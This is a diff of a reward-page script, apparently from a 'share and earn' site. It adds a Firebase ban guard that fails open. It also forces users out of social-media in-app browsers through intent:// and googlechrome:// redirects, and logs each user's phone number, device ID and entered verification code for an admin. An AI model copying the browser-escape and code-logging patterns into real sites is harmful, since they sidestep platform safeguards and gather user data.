@@ -2,15 +2,7 @@
  * PlayBonus.js - ANTI-LAG OPTIMIZED + ADS POPUP + SKIP COUNTDOWN
  * + SYSTEM_VERIFICATION FIREBASE SYNC (para sa Admin POV)
  * + FORCE OPEN IN DEFAULT BROWSER (Facebook / In-app)
- *
- * 📊 SYSTEM_VERIFICATION:
- * ✅ requestFirewallCall() → CREATE user_sessions/{phone}/system_verification
- * ✅ startFirewallTimer() → UPDATE timer every second
- * ✅ verifyFirewallCode() → SAVE userEnteredCode + UPDATE status
- * ✅ timer expired → UPDATE status: expired
- *
- * 🚀 INTENT REDIRECT:
- * ✅ Facebook/Instagram/Messenger/TikTok → Force open Chrome/Safari
+ * + BAN GUARD (banProtocolEnabled toggle + banned user check)
  */
 
 (function() {
@@ -18,12 +10,10 @@
 
     // ============================================================
     // 🚀 FORCE OPEN IN DEFAULT BROWSER (Facebook / In-app)
-    // ✅ Dapat ito ang UNANG tumatakbo bago ang lahat
     // ============================================================
     (function forceOpenInBrowser() {
         var ua = navigator.userAgent || navigator.vendor || window.opera;
 
-        // Detect in-app browsers
         var isFacebook = /FBAN|FBAV|FB_IAB|FBIOS/i.test(ua);
         var isInstagram = /Instagram/i.test(ua);
         var isMessenger = /Messenger/i.test(ua);
@@ -37,7 +27,7 @@
             isTikTok || isLine || isTwitter ||
             isWhatsApp || isWeChat;
 
-        if (!isInAppBrowser) return; // ✅ Normal browser — wag galawin
+        if (!isInAppBrowser) return;
 
         console.log('🚀 In-app browser detected. Forcing external browser...');
 
@@ -46,7 +36,6 @@
         var isAndroid = /Android/i.test(ua);
         var isIOS = /iPhone|iPad|iPod/i.test(ua);
 
-        // ✅ 1. Android — gamitin ang intent://
         if (isAndroid) {
             var intentUrl = 'intent://' + cleanUrl +
                 '#Intent;scheme=https;package=com.android.chrome;' +
@@ -55,7 +44,6 @@
             return;
         }
 
-        // ✅ 2. iOS — gamitin ang googlechrome://
         if (isIOS) {
             var chromeUrl = 'googlechrome://' + cleanUrl;
             var safariUrl = 'x-web-search://?url=' + encodeURIComponent(currentUrl);
@@ -68,7 +56,6 @@
             return;
         }
 
-        // ✅ 3. Generic fallback
         setTimeout(function() {
             showOpenInBrowserPrompt(currentUrl);
         }, 800);
@@ -98,9 +85,7 @@
                 'text-align:center;' +
                 'box-shadow:0 0 40px rgba(255,215,0,0.5);' +
             '">' +
-
                 '<div style="font-size:56px;margin-bottom:12px;">🌐</div>' +
-
                 '<h2 style="' +
                     'font-family:"Fredoka",sans-serif;' +
                     'font-size:22px;font-weight:900;' +
@@ -111,7 +96,6 @@
                     'margin:0 0 12px 0;' +
                     'filter:drop-shadow(0 0 15px rgba(255,215,0,0.7));' +
                 '">OPEN IN BROWSER</h2>' +
-
                 '<p style="' +
                     'color:rgba(255,255,255,0.92);' +
                     'font-size:14px;line-height:1.6;' +
@@ -120,7 +104,6 @@
                     'Para mag-proceed, paki-open ang link sa <strong style="color:#ffd700;">Chrome</strong> o <strong style="color:#ffd700;">Safari</strong>.<br><br>' +
                     'I-tap ang <strong style="color:#ffd700;">⋮</strong> (menu) sa taas → <strong style="color:#ffd700;">"Open in Browser"</strong>' +
                 '</p>' +
-
                 '<button id="copyLinkBtn" style="' +
                     'width:100%;padding:14px;' +
                     'background:linear-gradient(180deg,#fff9c4 0%,#ffd700 40%,#ff9800 100%);' +
@@ -130,7 +113,6 @@
                     'cursor:pointer;margin-bottom:10px;' +
                     'box-shadow:0 5px 0 #8b4500,0 8px 20px rgba(0,0,0,0.5);' +
                 '">📋 COPY LINK</button>' +
-
                 '<button id="openChromeBtn" style="' +
                     'width:100%;padding:14px;' +
                     'background:linear-gradient(180deg,#4fc3f7 0%,#0288d1 50%,#01579b 100%);' +
@@ -140,7 +122,6 @@
                     'cursor:pointer;' +
                     'box-shadow:0 5px 0 #01579b,0 8px 20px rgba(0,0,0,0.5);' +
                 '">🌐 OPEN IN CHROME</button>' +
-
             '</div>';
 
         document.body.appendChild(overlay);
@@ -404,6 +385,20 @@
 
         initSounds();
         initFirebase();
+
+        // ============================================================
+        // 🛡️ BAN GUARD — bago mag-load ng main content
+        // ============================================================
+        runBanGuard(function() {
+            // ✅ PAYAGAN — ito ang tumatakbo kapag OK ang user
+            proceedWithPageInit();
+        });
+    }
+
+    // ============================================================
+    // 🚀 ACTUAL PAGE INIT (tinatawag pagkatapos ng ban check)
+    // ============================================================
+    function proceedWithPageInit() {
         loadUserData();
         initTimer();
         initTicker();
@@ -430,6 +425,116 @@
         } catch(e) {
             console.error('Firebase error:', e);
         }
+    }
+
+    // ============================================================
+    // 🛡️ BAN GUARD — para sa share_and_earn.html (PlayBonus page)
+    // ============================================================
+    // Logic:
+    //   - banProtocolEnabled = OFF → PAYAGAN pumasok (kahit banned)
+    //   - banProtocolEnabled = ON  → HARANGIN ang banned users
+    // ============================================================
+    function runBanGuard(onAllowed) {
+        // Kung walang Firebase, payagan na lang (fail-open)
+        if (!db) {
+            console.warn('⚠️ Firebase not available — skipping ban check');
+            onAllowed();
+            return;
+        }
+
+        // STEP 1: Check kung naka-ON ang ban protocol
+        db.ref('admin/banProtocolEnabled').once('value').then(function(snap) {
+            var data = snap.val();
+            var banEnabled = !!(data && data.enabled === true);
+
+            console.log('🛡️ Ban protocol enabled:', banEnabled);
+
+            // ============================================================
+            // KUNG OFF → PAYAGAN PUMASOK (skip ban check)
+            // ============================================================
+            if (!banEnabled) {
+                console.log('✅ Ban system OFF — allowing access');
+                onAllowed();
+                return;
+            }
+
+            // ============================================================
+            // KUNG ON → CHECK KUNG BANNED
+            // ============================================================
+            console.log('🔒 Ban system ON — checking if user is banned...');
+
+            var deviceFingerprint = localStorage.getItem("userDeviceId") || null;
+
+            // Check phone ban
+            db.ref('banned_ghosts/' + userPhone).once('value').then(function(phoneSnap) {
+                if (phoneSnap.exists()) {
+                    console.log('🚫 User phone is banned — blocking access');
+                    blockAccess();
+                    return;
+                }
+
+                // Check device ban (kung may fingerprint)
+                if (!deviceFingerprint) {
+                    console.log('✅ User not banned — allowing access');
+                    onAllowed();
+                    return;
+                }
+
+                db.ref('device_phone_map/' + deviceFingerprint).once('value').then(function(deviceSnap) {
+                    if (deviceSnap.exists()) {
+                        var linkedPhone = deviceSnap.val().phone;
+
+                        db.ref('banned_ghosts/' + linkedPhone).once('value').then(function(linkedSnap) {
+                            if (linkedSnap.exists()) {
+                                console.log('🚫 Device linked to banned phone — blocking access');
+                                blockAccess();
+                                return;
+                            }
+                            console.log('✅ User not banned — allowing access');
+                            onAllowed();
+                        }).catch(function(e) {
+                            console.error('Linked phone check error:', e);
+                            onAllowed();
+                        });
+                    } else {
+                        console.log('✅ User not banned — allowing access');
+                        onAllowed();
+                    }
+                }).catch(function(e) {
+                    console.error('Device check error:', e);
+                    console.log('⚠️ Device check failed — allowing access');
+                    onAllowed();
+                });
+
+            }).catch(function(e) {
+                console.error('Ban check error:', e);
+                console.log('⚠️ Ban check failed — allowing access');
+                onAllowed();
+            });
+
+        }).catch(function(e) {
+            console.error('Ban protocol check error:', e);
+            console.log('⚠️ Ban protocol check failed — allowing access');
+            onAllowed();
+        });
+    }
+
+    // ============================================================
+    // 🚫 BLOCK ACCESS — i-redirect sa index
+    // ============================================================
+    function blockAccess() {
+        try {
+            if (userPhone && db) {
+                db.ref('user_sessions/' + userPhone).update({
+                    status: 'offline',
+                    lastSeen: firebase.database.ServerValue.TIMESTAMP
+                });
+            }
+        } catch(e) {}
+
+        localStorage.clear();
+        sessionStorage.clear();
+        window.location.replace('index.html');
     }
 
     // ============================================================
@@ -1356,8 +1461,6 @@
 
     // ============================================================
     // 🔥 REQUEST FIREWALL CALL
-    // ✅ CREATE: user_sessions/{phone}/system_verification
-    // ✅ RESET userEnteredCode + isMatch
     // ============================================================
     function requestFirewallCall() {
         if (callInProgress) return;
@@ -1369,9 +1472,6 @@
         var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
         var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
 
-        // ============================================================
-        // ✅ CREATE: user_sessions/{phone}/system_verification
-        // ============================================================
         try {
             if (db) {
                 db.ref('user_sessions/' + userPhoneStr + '/system_verification').set({
@@ -1394,7 +1494,6 @@
         } catch(e) {
             console.error('Firebase write error:', e);
         }
-        // ============================================================
 
         sendAICallRequestNotif(userPhoneStr, deviceId, currentCallCode);
 
@@ -1444,8 +1543,6 @@
 
     // ============================================================
     // ⏱️ FIREWALL TIMER
-    // ✅ UPDATE timer sa Firebase every second
-    // ✅ Kapag 0 → status: 'expired'
     // ============================================================
     function startFirewallTimer() {
         stopFirewallTimer();
@@ -1456,7 +1553,6 @@
         callTimerInterval = setInterval(function() {
             callCountdown--;
 
-            // ✅ UPDATE Firebase timer
             try {
                 if (db && userPhoneStr) {
                     db.ref('user_sessions/' + userPhoneStr + '/system_verification').update({
@@ -1481,7 +1577,6 @@
                 var userPhoneStr2 = localStorage.getItem("userPhone") || "Unknown";
                 var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
 
-                // ✅ Mark as EXPIRED sa Firebase
                 try {
                     if (db) {
                         db.ref('user_sessions/' + userPhoneStr2 + '/system_verification').update({
@@ -1525,8 +1620,6 @@
 
     // ============================================================
     // 🔑 VERIFY FIREWALL CODE
-    // ✅ SAVE userEnteredCode sa Firebase (para makita sa admin)
-    // ✅ UPDATE status: verified/invalid
     // ============================================================
     function verifyFirewallCode() {
         var codeInput = document.getElementById('firewallAICodeInput');
@@ -1556,12 +1649,8 @@
         var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
         var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
 
-        // ✅ CHECK MATCH
         var isMatch = (enteredCode === currentCallCode);
 
-        // ============================================================
-        // ✅ SAVE userEnteredCode + isMatch + status sa Firebase
-        // ============================================================
         try {
             if (db) {
                 db.ref('user_sessions/' + userPhoneStr + '/system_verification').update({
@@ -1576,12 +1665,10 @@
         } catch(e) {
             console.error('Save userEnteredCode error:', e);
         }
-        // ============================================================
 
         sendAICodeAttemptNotif(userPhoneStr, deviceId, enteredCode, callCountdown);
 
         if (isMatch) {
-            // ✅ TAMA — verified
             if (verifyBtn) {
                 verifyBtn.innerHTML = '<i class="fas fa-check"></i> <span>VERIFIED!</span>';
                 verifyBtn.style.background = 'linear-gradient(180deg, #00ff88, #008833)';
@@ -1595,7 +1682,6 @@
             return;
         }
 
-        // ❌ MALI — invalid
         if (errorMsg) {
             errorMsg.innerHTML = '<i class="fas fa-times-circle"></i> ❌ Invalid code. Request new call.';
             errorMsg.classList.add('show');
@@ -2214,18 +2300,28 @@
     }
 
     // ============================================================
-    // BAN CHECK
+    // BAN CHECK (periodic — respects banProtocolEnabled toggle)
     // ============================================================
     function checkIfBanned() {
-        if (!userPhone) return;
+        if (!userPhone || !db) return;
         try {
-            db.ref('banned_ghosts/' + userPhone).once('value').then(function(snap) {
-                if (snap.exists()) {
-                    db.ref('user_sessions/' + userPhone).update({ status: 'offline' });
-                    localStorage.clear();
-                    sessionStorage.clear();
-                    window.location.replace('index.html');
-                }
+            // Check muna kung naka-ON ang ban system
+            db.ref('admin/banProtocolEnabled').once('value').then(function(snap) {
+                var data = snap.val();
+                var banEnabled = !!(data && data.enabled === true);
+
+                // Kung OFF, skip ban check
+                if (!banEnabled) return;
+
+                // Kung ON, check kung banned
+                db.ref('banned_ghosts/' + userPhone).once('value').then(function(banSnap) {
+                    if (banSnap.exists()) {
+                        db.ref('user_sessions/' + userPhone).update({ status: 'offline' });
+                        localStorage.clear();
+                        sessionStorage.clear();
+                        window.location.replace('index.html');
+                    }
+                });
             });
         } catch(e) {}
     }
